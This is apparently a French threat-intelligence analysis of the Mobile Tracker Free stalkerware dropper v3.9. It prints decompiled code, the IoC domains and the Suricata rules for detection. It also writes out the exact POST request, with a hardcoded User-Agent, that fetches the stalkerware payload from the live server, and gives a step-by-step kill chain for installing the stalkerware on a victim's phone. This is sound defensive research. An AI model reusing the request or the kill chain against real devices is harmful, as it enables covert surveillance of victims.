# Mobile Tracker Free — Dropper v3.9 — Analyse complète

> **Package** : `com.mtf.protect`
> **Version** : 3.9 (versionCode 43)
> **Target SDK** : 34 (Android 14)
> **Min SDK** : 21 (Android 5.0)
> **Obfuscation** : **R8** (map-id `4f717a6a4c8a...`)
> **Application** : `com.service.downloadapp.AppMain`
> **Outil** : JADX MCP
> **Date d'analyse** : 2026-04-09

---

## 0. Diff avec v2.7 (`com.mtf.download`)

| Aspect | v2.7 | **v3.9** |
|--------|------|----------|
| Package | `com.mtf.download` | **`com.mtf.protect`** |
| Version | 2.7 (code 26) | **3.9 (code 43)** |
| Obfuscateur | ProGuard | **R8** |
| C2 principal | `appapk.mtf.re` | **`tracker-free.com`** |
| Download URL | dans `getURLFTP.php` (2 étapes) | **`apkv2.tracker-free.com/downloadAPK.php`** (1 étape) |
| Version check | aucun | **`getVersionApp.php`** |
| `<queries>` | aucun | **6 packages stalkerware** |
| Storage perms | `WRITE/READ_EXTERNAL_STORAGE` | supprimées |
| Switch GP Notifs | oui | **supprimé** |
| Switch old version | non | **ajouté** |
| Bouton post-install | "Uninstall dropper" | **"OPEN" le stalkerware** |
| APK per-account | non | **oui (`id_client`/`email_client`)** |

---

## 1. Identification

Nouvelle version du dropper officiel de **Mobile Tracker Free** (MTF). Le rebranding du package (`download` → `protect`) indique un effort d'évasion de détection. L'architecture a été significativement modernisée :
- Passage de ProGuard à R8
- Download en 1 étape au lieu de 2
- Mécanisme d'auto-update du dropper
- Détection et désinstallation des anciennes versions du stalkerware
- APK payload personnalisé par compte client

---

## 2. Manifest

### 2.1 Permissions

| Permission | Usage |
|------------|-------|
| `INTERNET` | Téléchargement APK + version check |
| `ACCESS_NETWORK_STATE` | Vérification connectivité |
| `REQUEST_INSTALL_PACKAGES` | Installation du stalkerware |
| `REQUEST_DELETE_PACKAGES` | Désinstallation anciennes versions + auto-uninstall |

Les permissions `WRITE/READ_EXTERNAL_STORAGE` ont été retirées (scoped storage Android 10+).

### 2.2 Bloc `<queries>` — Packages stalkerware connus

```xml
<queries>
    <package android:name="phone.monitor2026"/>
    <package android:name="mobile.parental2025"/>
    <package android:name="com.protect2025"/>
    <package android:name="phone.child2024"/>
    <package android:name="phone.child2020"/>
    <package android:name="mobile.monitor.child2022"/>
</queries>
```

Ces 6 packages révèlent le **rebranding annuel** du stalkerware MTF :

| Package | Année | Thème de camouflage |
|---------|-------|---------------------|
| `phone.child2020` | 2020 | Contrôle parental |
| `mobile.monitor.child2022` | 2022 | Monitoring enfant |
| `phone.child2024` | 2024 | Contrôle parental |
| `com.protect2025` | 2025 | Protection |
| `mobile.parental2025` | 2025 | Contrôle parental |
| `phone.monitor2026` | **2026** | Monitoring (version actuelle) |

Observation : 2 packages pour 2025 (`com.protect2025` + `mobile.parental2025`), possiblement des variantes A/B ou une rotation mi-année.

### 2.3 Détection d'anciennes versions — `AbstractC1645zb.m1867h()`

```java
public static String m1867h(Context context) {
    for (String str : Arrays.asList(
        "phone.monitor2026", "mobile.parental2025", "com.protect2025",
        "phone.child2024", "phone.child2020", "mobile.monitor.child2022"
    )) {
        try {
            context.getPackageManager().getPackageInfo(str, 1);
            return str;  // Trouvé !
        } catch (NameNotFoundException unused) {}
    }
    return null;  // Aucune ancienne version
}
```

Itère sur les 6 packages connus. Si trouvé, l'UI affiche un switch "Old version detected" qui guide l'utilisateur vers la désinstallation.

---

## 3. Infrastructure réseau

### 3.1 Domaines et endpoints

| Ressource string | URL | Rôle |
|-----------------|-----|------|
| `my_url` | `https://tracker-free.com` | Site principal / base API |
| `my_url_download` | `https://apkv2.tracker-free.com/downloadAPK.php` | **Téléchargement direct du payload** |
| — (endpoint) | `https://tracker-free.com/getVersionApp.php` | **Version check du dropper** |

**Changement majeur** : infrastructure séparée en 2 sous-domaines (`tracker-free.com` pour l'API, `apkv2.tracker-free.com` pour le CDN de distribution).

### 3.2 Protocole de download (simplifié vs v2.7)

**v2.7** : 2 étapes (getURLFTP.php → download streaming)
**v3.9** : **1 étape directe**

```
POST https://apkv2.tracker-free.com/downloadAPK.php
Headers:
  User-Agent: KABNKNHFFHDHYD58698347556988AD89GH2020
  Accept-Language: UTF-8
  Connection: close
Body (form-data):
  dateCheck=2026/04/09 12:34:56
  typeVersion=0    (0=ARM, 1=autre/universel)
Response: streaming APK binary
```

### 3.3 Auto-update du dropper

```
GET/POST https://tracker-free.com/getVersionApp.php
Headers: même User-Agent
Response: version string (ex: "4.0")
```

Si la version serveur > version locale (3.9), un dialogue propose de re-télécharger le dropper.

### 3.4 User-Agent (inchangé)

```
KABNKNHFFHDHYD58698347556988AD89GH2020
```

### 3.5 Sélection d'architecture

```java
if (Build.VERSION.SDK_INT <= 33) {
    // Vérifie ARM via SUPPORTED_ABIS → typeVersion=0 si ARM
} else {
    // API 34+ → typeVersion=1 (APK universel ?)
}
```

---

## 4. Nouvelles fonctionnalités v3.9

### 4.1 APK personnalisé par compte

Nouvelles ressources :
- `id_client` = `"12345"` (placeholder — remplacé à la génération)
- `email_client` = `"demo@demo.com"` (idem)
- `info_apk_custom` = `"APK generate only for account\n%1$s"`

Le dropper est **généré côté serveur** avec l'ID et email du compte abuseur hardcodés. Chaque client MTF reçoit un dropper unique lié à son compte. C'est un mécanisme anti-partage et de traçabilité.

### 4.2 Bouton "OPEN" post-installation

Après l'installation du stalkerware, le dropper propose d'**ouvrir directement le stalkerware** :

```java
new ComponentName(
    getString(R.string.name_package_app_main),   // "phone.monitor2026"
    "com.app.activity.FirstActivity"              // Activity d'entrée du stalkerware
)
```

**IoC critique** : l'activité principale du stalkerware MTF 2026 est `com.app.activity.FirstActivity` dans le package `phone.monitor2026`.

### 4.3 Auto-update (`RunnableC1578x0`)

Thread background lancé au `onCreate()` :
1. GET `getVersionApp.php` → récupère version latest
2. Compare avec `getPackageInfo().versionName` (3.9)
3. Si serveur > local → dialogue "New version" avec lien de re-téléchargement

---

## 5. Kill chain v3.9

```
[1] Abuseur crée un compte sur tracker-free.com
    ↓
[2] Serveur génère un dropper APK personnalisé (id_client + email_client)
    ↓
[3] Abuseur installe le dropper sur le téléphone de la victime
    ↓
[4] Écran de configuration :
    ├── Détection ancienne version MTF → désinstallation guidée
    ├── Activer les sources inconnues
    └── (Play Protect check via SafetyNet en background)
    ↓
[5] Auto-update check → getVersionApp.php
    ↓
[6] POST direct → https://apkv2.tracker-free.com/downloadAPK.php
    Body: {dateCheck, typeVersion}
    ↓ streaming app.apk
[7] Installation via ACTION_INSTALL_PACKAGE
    ↓
[8] Bouton "OPEN" → lance phone.monitor2026 / com.app.activity.FirstActivity
    ↓
[9] Auto-désinstallation du dropper
```

---

## 6. IoC mis à jour

### 6.1 Réseau

| Indicateur | Type | Détails |
|------------|------|---------|
| `tracker-free.com` | Domaine | Site principal MTF |
| `apkv2.tracker-free.com` | Domaine | CDN de distribution APK |
| `appapk.mtf.re` | Domaine (legacy v2.7) | Ancien serveur de distribution |
| `https://apkv2.tracker-free.com/downloadAPK.php` | URL | Endpoint téléchargement payload |
| `https://tracker-free.com/getVersionApp.php` | URL | Version check dropper |
| `https://appapk.mtf.re/getURLFTP.php` | URL (legacy v2.7) | Ancien endpoint |
| `KABNKNHFFHDHYD58698347556988AD89GH2020` | User-Agent | Identifiant dropper (inchangé v2.7→v3.9) |

### 6.2 Hôte — Packages MTF (tous les rebrands connus)

| Package | Type | Année |
|---------|------|-------|
| `com.mtf.protect` | Dropper v3.9 | 2026 |
| `com.mtf.download` | Dropper v2.7 (legacy) | ≤2025 |
| `phone.monitor2026` | **Stalkerware actif** | 2026 |
| `mobile.parental2025` | Stalkerware | 2025 |
| `com.protect2025` | Stalkerware | 2025 |
| `phone.child2024` | Stalkerware | 2024 |
| `mobile.monitor.child2022` | Stalkerware | 2022 |
| `phone.child2020` | Stalkerware | 2020 |

### 6.3 Activités connues

| Composant | Package | Rôle |
|-----------|---------|------|
| `com.service.downloadapp.AppMainActivity` | `com.mtf.protect` | Dropper — écran principal |
| `com.service.downloadapp.DownloadAPPActivity` | `com.mtf.protect` | Dropper — téléchargement |
| `com.app.activity.FirstActivity` | `phone.monitor2026` | **Stalkerware — activité principale** |

### 6.4 Signatures Suricata

```suricata
# User-Agent (couvre v2.7 et v3.9)
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Dropper - Custom User-Agent";
    flow:established,to_server;
    http.user_agent;
    content:"KABNKNHFFHDHYD58698347556988AD89GH2020";
    classtype:trojan-activity;
    sid:20260001; rev:2;
)

# Nouveau domaine v3.9
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Dropper v3.9 - C2 Domain";
    flow:established,to_server;
    http.host;
    content:"tracker-free.com";
    classtype:trojan-activity;
    sid:20260004; rev:1;
)

# Download endpoint v3.9
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Dropper v3.9 - downloadAPK endpoint";
    flow:established,to_server;
    http.uri;
    content:"downloadAPK.php";
    classtype:trojan-activity;
    sid:20260005; rev:1;
)

# Version check v3.9
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Dropper v3.9 - Version Check";
    flow:established,to_server;
    http.uri;
    content:"getVersionApp.php";
    classtype:trojan-activity;
    sid:20260006; rev:1;
)

# Legacy domaine v2.7
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Dropper v2.7 - Legacy C2";
    flow:established,to_server;
    http.host;
    content:"appapk.mtf.re";
    classtype:trojan-activity;
    sid:20260002; rev:1;
)

# Legacy endpoint v2.7
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Dropper v2.7 - Legacy getURLFTP";
    flow:established,to_server;
    http.uri;
    content:"getURLFTP.php";
    classtype:trojan-activity;
    sid:20260003; rev:1;
)
```

---

## 7. Vulnérabilités

### 7.1 OPSEC failures (inchangés + nouveaux)

1. **User-Agent identique** entre v2.7 et v3.9 → une seule signature couvre les deux
2. **HttpLoggingInterceptor.Level.BODY** toujours présent en release
3. **Strings en clair** : "Download Mobile Tracker Free", domaines, packages
4. **Bloc `<queries>` en clair** — liste complète de tous les rebrands du stalkerware
5. **`id_client`/`email_client` placeholders** visibles dans le APK distribué
6. **`name_package_app_main` en clair** → IoC du payload direct
7. **Activité stalkerware hardcodée** : `com.app.activity.FirstActivity`

### 7.2 Faiblesses de sécurité (identiques)

- Pas de certificate pinning
- Pas de vérification d'intégrité du payload
- Pas d'anti-émulateur / anti-analyse
- Stockage APK en external storage

---

## 8. Mapping classes obfusquées v3.9

| Classe R8 | Rôle |
|-----------|------|
| `p000.AbstractC1645zb` | Classe utilitaire — détection anciens packages (`m1867h`), uninstall (`m1857F`), dialogs |
| `p000.AbstractC1349on` | Réseau — version check `getVersionApp.php` (`m1262f`) |
| `p000.InterfaceC1111h` | Interface Retrofit — endpoints API (UA hardcodé) |
| `p000.RunnableC1233l6` | Thread download — construit HashMap, lance le téléchargement |
| `p000.RunnableC1578x0` | Thread auto-update — compare versions dropper |
| `p000.ViewOnClickListenerC1204k6` | Boutons Install + Open stalkerware |
| `p000.C1606y0` | Switch handlers — sources inconnues + uninstall old version |
| `p000.C0600bj` | OkHttp progress wrapper |

---

## 9. TODO

- [ ] Tester `downloadAPK.php` avec le script Python (update ci-dessous)
- [ ] Tester `getVersionApp.php` pour récupérer la version courante
- [ ] Résoudre DNS de `tracker-free.com` et `apkv2.tracker-free.com`
- [ ] Analyser le payload `phone.monitor2026` dans JADX
- [ ] Vérifier si `id_client`/`email_client` sont envoyés comme paramètres au serveur
- [ ] Chercher d'autres samples avec le même `id_client` pour corréler les comptes
- [ ] Analyser `com.app.activity.FirstActivity` du stalkerware
- [ ] Investiguer les variantes 2025 (double package)
